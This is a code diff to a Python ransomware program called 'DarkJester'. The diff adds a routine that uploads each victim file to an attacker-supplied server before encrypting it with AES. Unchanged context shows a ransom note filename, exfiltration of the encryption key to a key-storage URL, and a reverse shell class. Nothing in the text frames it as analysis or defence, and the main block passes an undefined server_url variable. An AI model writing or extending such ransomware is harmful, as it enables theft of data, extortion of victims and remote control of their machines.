@@ -21,12 +21,27 @@ class DarkJester:
         self.key = get_random_bytes(key_size)
         self.iv = get_random_bytes(iv_size)
 
-    def encrypt_file(self, filepath):
+    def exfiltrate_file(self, filepath, server_url):
+        try:
+            with open(filepath, 'rb') as file:
+                file_data = file.read()
+                filename = os.path.basename(filepath)
+                files = {'file': (filename, file_data)}
+                response = requests.post(server_url, files=files)
+                if response.status_code == 200:
+                    print(f"[+] File {filename} exfiltrated successfully.")
+                else:
+                    print(f"[-] Failed to exfiltrate {filename}. Status code: {response.status_code}")
+        except Exception as e:
+            print(f"[-] Error exfiltrating {filepath}: {e}")
+
+    def encrypt_file(self, filepath, server_url):
         try:
             if os.path.basename(filepath) in ["darkjester_encryptor_mass.py", "darkjester_encryptor_mass.exe", "PLEASE_READ_ME.txt", "darkjester_decryptor_mass.py", "darkjester_decryptor_mass.exe"]:
                 return
             if filepath.endswith('.mime'):
                 return
+            self.exfiltrate_file(filepath, server_url)
             cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
             with open(filepath, 'rb') as src:
                 padded_data = pad(src.read(), AES.block_size)
@@ -123,7 +138,7 @@ class ReverseShell:
 if __name__ == "__main__":
     jester = DarkJester()
     shell = ReverseShell('127.0.0.1', 1234) # Modify this
-    jester.encrypt_directory("path/to/directory", max_threads=30) # Modify this, adjust thread if needed
+    jester.encrypt_directory("path/to/directory", server_url, max_threads=30) # Modify this, adjust thread if needed
     jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
     shell.start()
 
